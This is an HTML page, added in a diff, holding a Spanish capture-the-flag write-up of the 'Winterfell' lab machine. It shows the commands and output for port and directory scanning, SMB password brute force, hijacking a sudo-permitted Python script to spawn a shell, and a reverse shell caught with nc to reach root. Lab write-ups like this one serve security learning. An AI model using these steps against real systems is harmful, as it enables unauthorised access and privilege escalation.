@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Write‑up: Winterfell</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+  <!-- NAVBAR -->
+  <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex justify-between items-center h-16">
+        <div class="flex-shrink-0">
+          <h1 class="font-semibold">Santiago Lorenzo</h1>
+        </div>
+        <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeup.html" class="hover:text-blue-400 transition">Write‑ups</a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <main class="max-w-4xl mx-auto px-6 py-12">
+    <h1 class="text-4xl font-bold mb-2">❄️ Máquina: Winterfell</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 31/08/2025 | Categoría: LINUX </p>
+
+    <!-- DESCRIPCIÓN -->
+    <section class="mb-10">
+      <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+      <p class="text-gray-300 leading-relaxed">
+        Reto ambientado en Juego de Tronos. El vector principal combina enumeración web
+        y servicios SMB para conseguir credenciales, pivotar entre usuarios en el sistema y finalizar con una 
+        escalada de privilegios a <code>root</code> mediante un script privilegiado.
+      </p>
+    </section>
+
+    <!-- RECON -->
+    <section class="mb-10">
+      <h2 class="text-2xl font-semibold mb-2">🔍 Reconocimiento</h2>
+      <pre><code class="language-bash">
+            sudo nmap -p- -open -O -sS -sCV -min-rate 5000 -n -Pn -vvv 172.17.0.2
+
+            PORT    STATE SERVICE     VERSION
+            22/tcp  open  ssh         OpenSSH 9.2p1 (Debian 12)
+            80/tcp  open  http        Apache httpd 2.4.61 (Debian)
+            139/tcp open  netbios-ssn Samba smbd 4
+            445/tcp open  netbios-ssn Samba smbd 4
+        </code></pre>
+      <p class="text-gray-300">HTTP y SMB llaman la atención para la enumeración inicial.</p>
+    </section>
+
+        <img src="../Assets/winterfell/1-index.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+
+    <!-- WEB ENUM -->
+    <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">🌐 Enumeración Web</h2>
+        <pre><code class="language-bash">gobuster dir -u http://172.17.0.2/ 
+            -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+            -x php,html,txt -t 50 -r
+
+            /index.html (200)
+            /dragon    (200)
+        </code></pre>
+        
+        <img src="../Assets/winterfell/2-directorio-dragon.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+        
+        <p class="text-gray-300">El directorio <code>/dragon</code> contiene pistas/“episodios”.
+        Guardamos palabras para un diccionario personal.</p>
+    </section>
+        <img src="../Assets/winterfell/3-gragon-episodiosT1.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+
+
+    <!-- SMB ENUM / CRED -->
+    <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">📦 SMB: usuarios y fuerza bruta</h2>
+        <pre><code class="language-bash">
+    enum4linux -a 172.17.0.2 
+    # Usuarios válidos descubiertos: jon, aria, daenerys
+
+    # SMBv1 está deshabilitado, usamos CrackMapExec (maneja SMBv2/3)
+    crackmapexec smb 172.17.0.2 -u users.txt -p list.txt
+    SMB  172.17.0.2  [+]  172.17.0.2\jon:seacercaelinvierno
+        </code></pre>
+        <p class="text-gray-300">Con las palabras de <code>/dragon</code> y los usuarios de SMB obtenemos
+        la primera credencial: <code>jon : seacercaelinvierno</code>.</p>
+    </section>
+
+    <!-- SMB ACCESS + SECRET -->
+    <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">📂 Acceso a compartidos</h2>
+        <pre><code class="language-bash">
+smbclient //172.17.0.2/shared -U jon
+
+Password for [WORKGROUP\jon]:
+
+smb: \> ls
+  .                                   D        0  Sat Aug 30 21:57:45 2025
+  ..                                  D        0  Tue Jul 16 16:25:59 2024
+  proteccion_del_reino                N      313  Tue Jul 16 16:26:00 2024
+
+                82083148 blocks of size 1024. 44533204 blocks available
+
+smb: \> get proteccion_del_reino
+        </code></pre>
+        <p class="text-gray-300">Contenido de el archivo proteccion_del_reino</p>
+    
+        <img src="../Assets/winterfell/4-proteccion-del-reino.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+
+                <p class="text-gray-300">Deciframos el mensaje:</p>
+
+<pre><code class="language-bash">
+echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d
+hijodelanister</code></pre>
+      <p class="text-gray-300">La cadena Base64 revela <strong>hijodelanister</strong>, que usaremos para el siguiente acceso.</p>
+    </section>
+
+    <!-- SSH JON Y PRIVESC CADENA -->
+    <section class="mb-10">
+      <h2 class="text-2xl font-semibold mb-2">🧩 Acceso por SSH y movimiento lateral</h2>
+      <pre><code class="language-bash">ssh jon@172.17.0.2
+# password: hijodelanister
+
+# Capacidad de ejecutar un script como "aria" sin password
+sudo -l
+User jon may run the following commands:
+  (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
+
+# Reemplazamos el script con un shell
+jon@44a71ad38e16:~$ rm .mensaje.py
+rm: remove write-protected regular file '.mensaje.py'? yes
+jon@44a71ad38e16:~$ nano .mensaje.py
+
+#import os
+#os.system("/bin/bash")
+
+sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py   # =&gt; shell como aria
+</code></pre>
+      <p class="text-gray-300">Con <code>aria</code> podemos leer la carpeta de <code>daenerys</code> y encontrar
+        una nota con su contraseña.</p>
+      <pre><code class="language-bash">
+sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
+
+Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
+Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.
+
+!drakaris!
+
+su daenerys
+# password: !drakaris!</code></pre>
+    </section>
+
+    <!-- ROOT -->
+    <section class="mb-10">
+      <h2 class="text-2xl font-semibold mb-2">👑 Escalada a root</h2>
+      <pre><code class="language-bash">sudo -l
+User daenerys may run the following commands:
+  (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
+
+# El script lanza una reverse shell como root
+# (Ajustar IP/puerto en el script si es necesario)
+
+# Atacante
+nc -lvnp 4444
+
+# Víctima (como daenerys)
+sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
+
+# Sesión entrante
+root@44a71ad38e16:/home# whoami
+root</code></pre>
+      <p class="text-gray-300">Ejecutando el script privilegiado se obtiene una shell de <code>root</code> en el listener.</p>
+    </section>
+
+    <!-- RESULTADO -->
+    <section class="mb-12">
+      <h2 class="text-2xl font-semibold mb-2">🏁 Resultado</h2>
+      <p class="text-gray-300">Acceso total a la máquina con privilegios de <code>root</code> tras encadenar:
+        enumeración web → SMB (credenciales) → SSH (jon) → sudo a <code>aria</code> (script) →
+        lectura de secreto → <code>daenerys</code> → ejecución de script privilegiado.</p>
+    </section>
+
+    <div class="mt-10">
+      <a href="../writeup.html" class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+        ← Volver a la lista de Write‑ups
+      </a>
+    </div>
+  </main>
+</body>
+</html>
